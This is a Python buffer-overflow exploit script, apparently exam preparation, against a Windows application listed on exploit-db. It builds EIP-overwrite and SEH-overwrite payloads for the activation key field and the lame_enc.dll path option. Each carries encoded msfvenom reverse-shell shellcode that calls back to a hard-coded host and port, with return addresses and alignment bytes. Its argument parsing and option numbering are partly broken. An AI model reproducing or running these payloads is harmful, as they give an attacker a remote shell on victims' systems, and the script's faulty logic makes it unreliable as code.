#!/usr/bin/env python3


# Tyler Boykin
#
# Purpose:  Time trial/exam prep
#
# Location where I downloaded the binary:
#   https://www.exploit-db.com/exploits/46670
#
#   Total time: ~2 hours.  Repeated similar methods as others

from struct import pack
import sys




def p(x):
    return pack('<I',x)


def usage():
    print(  f"Usage: {sys.argv[0]}  --os <opt> --type <opt>\n"\
            "OS Options:\n"\
            "|__[*] 1: Windows 2003SP1 Std\n"\
            "|__[*] 2: Windows Vista Pro\n"\
            "|__[*] 3: Windows 8.1 Pro\n"\
            "\n"\
            "Types:\n"\
            "|__[*] 1:  SEH (All)\n"\
            "|__[*] 2:  EIP (2003/Vista)\n")
    sys.exit(-1)

def activation_code_eip_overwrite():

    # Works with
    #   Windows Vista Pro
    #   Windows 2003SP1 Std.


    # \x01 - \x6f   : GOOD
    # \x70 - \x7e   : BAD (get \x33 subtracted)
    # \x7f          : SOMEHOW GOOD
    # \x80 ++       : APPEAR TO BE BAD (ESCAPED OR \x33 subtracted)
    
    """
    Supply to the 'ACTIVATION KEY' field directly.

    Outputting to STDIN via terminal may not give you the full payload, highly encourage outputting to a file first.
    """

    OFFSET = 868
    TAIL_LEN = 3028

    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.102.46 LPORT=123 -e x86/alpha_upper -f raw
    buf = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLZHMREPS030E0K9JE01YPU4LKPP00LK0RDLLK1BB4LKSBVHTOH71ZQ601KONLWL3QSLS2FLGPYQ8OTM31YWZBJR1BPWLKPR4PLKPJGLLKPL21RXZCQXC1N1V1LKQIGP318SLKPI28M3FZ0ILK6TLK31HVVQKONL9QHOTM5QHG08KP3EL6DC3MZXWKSM7TD5ZDV8LK1HVDC1HS56LKDL0KLKPX5LUQYCLK34LK5Q8PLI747TFD1K1KSQV9PZPQKOKPQOQOPZLK22JKLMQMBHFSVRUPS0RHD7D3FR1OPTRHPLD7Q637KOXUH8J0UQUPS07Y8DQD60CXVIMP2K30KO9EF0V0V00PG0F0QP0PU8ZJDOYOKPKOYELW2J3558O098BFVN3XC2EPC03KMYKVBJDPV6F7CXJ9NESD51KOXUMUYPCDDLKOPN5XBUJLE8L0X59266KOHUE8RC2MSTC0MYKSF767V7VQJVSZ4R0Y1FJBKMRFYWW4WTGLEQEQLM7414R0XFEP1T1DF0PVV6PVW6660N0VPVQCF6BHSIHLWOLFKON5LIKP0NF6W6KOP0BHEXK7EME0KO9EOKZPH5Y20V58OVLUOMMMKO9EWLTFCLUZMPKKKPRUC5OKW74ST2ROSZUPPSKO9EAA"
    
    pop_pop_ret = p(0x10021522).decode("latin1")

    exploit = ""
    exploit += "A" * (612 - 4)
    exploit += '\x3B\x01'       #__CMP
    exploit += '\x7F\x06'       #__JG SHORT 6 BYTES
    exploit += pop_pop_ret
    exploit += "\x44" * 18      #__ESP EIP ALIGNMENT
    exploit += "\x5c"           #__ESP EIP ALIGNMENT
    exploit += "\x54"           #__BUFFER REGISTER PREPARE
    exploit += "\x58"           #__BUFFER REGISTER PREPARE
    exploit += "\x04\x24"       #__BUFFER REGISTER PREPARE
    exploit += "\x42" * 5       #__FILLER
    exploit += buf
    exploit += "B" * ( TAIL_LEN - len(buf) - 16 - 9 )
    print(exploit)

# Works with:
#   Win Vista Pro
#   Win 2003SP1 Std.
#   Win 8.1 Pro
def options_lame_enc_path_seh():
    
    """
    Supply this to the Lame_enc.dll path under Options
    
    Outputting to STDIN via terminal may not give you the full payload, highly encouarge outputting to a file first.
    
    """
    
    OFFSET = 280
    nSEH = 'AAAA'
    SEH = '1234'
    TAIL_LEN = 3612
    
    # msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.102.46 LPORT=123 -e x86/alpha_upper BufferRegister=EAX -f raw
    buf = "PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIKLM8MREPS030U0LIJEVQ9PCTLKF0FPLKF2TLLKF25DLKBRFH4O87QZWV01KONL7LU13LUR6L7PIQ8ODMUQIWJBKB1B0WLK0RB0LK1ZWLLKPLDQBXZCG8UQ8QPQLKPYWP319CLKQY5HM3VZ79LKWDLKEQXVFQKONL9QHO4MC1HG6XKP3EZVS3SMJX7KCMWTSEZDV8LK0XQ4C1HSU6LK4L0KLK685LEQN3LKC4LKEQN0K9G4FDWT1K1KU11I0ZV1KOKP1O1OQJLK4RZKLM1MU8WC025PEP58BWCC021OQDSX0L2WGVTGKOXUH8J05Q5PC06IYTPT603XVIMPRKUPKO9EV0PP6060700P1PV058ZJTOYOM0KO9EZ7CZC5SX9P982FVNE85RC0C0CKLIJFSZ206667E8J9952TU1KO8UK5IPBT4LKOPNTHSEJLRHL08592V6KOXUSX3SRM2DUPK9M3V71G676QJVCZB20Y1FM2KM3V8GQTFDGLS1S1LMW46DDP8F301T0TPPQFF60VPFV6PN66QFQCPV2HD98LWOK6KOIELIM0PNF60FKOVP3XDHMWEMCPKO8UOKJPOENBV63XOVZ5OMMMKOIE7L36SLTJMPKKKPSE35OKQWR3CBBOCZ30PSKOXUAA"

    pop_pop_ret_1 = p(0x10021522).decode("latin1")

    exploit = ""
    exploit += "A" * OFFSET     #__FILLER
    exploit += "HHw\x06"        #__JA SHORT BY 6 BYTES
    exploit += pop_pop_ret_1    #__SEH
    exploit += "\x44" * 10      #__EIP ESP ALIGNMENT
    exploit += "\x5c"           #__EIP ESP ALIGNMENT
    exploit += "\x54"           #__BUFFER REGISTER PREPARE
    exploit += "\x58"           #__BUFFER REGISTER PREPARE
    exploit += "\x04\x18"       #__BUFFER REGISTER PREPARE
    exploit += "\x41"           #__FILLER
    exploit += buf
    exploit += "A" * (TAIL_LEN - 400)
    print(exploit)

if __name__ == '__main__':
    os = 0
    e_type = 0
    for k,v in enumerate(sys.argv[1]):
        if v in ["--os"]:
            os = int(sys.argv[k+1])
        if v in ["--type"]:
            e_type = int(sys.argv[k+1])
        if v in ["-h","--help","-help","--h"]:
            usage()

        if os == 3:
            print("[*] Windows 8.1 Pro selected... defaulting to seh")
            options_lame_enc_path_seh()
        elif os == 1:
            if e_type == 1:
                activation_code_eip_overwrite()
            elif e_type == 2:
                options_lame_enc_path_seh()
        elif os == 2:
            if e_type == 1:
                activation_code_eip_overwrite()
            elif e_type == 2:
                options_lame_enc_path_seh()
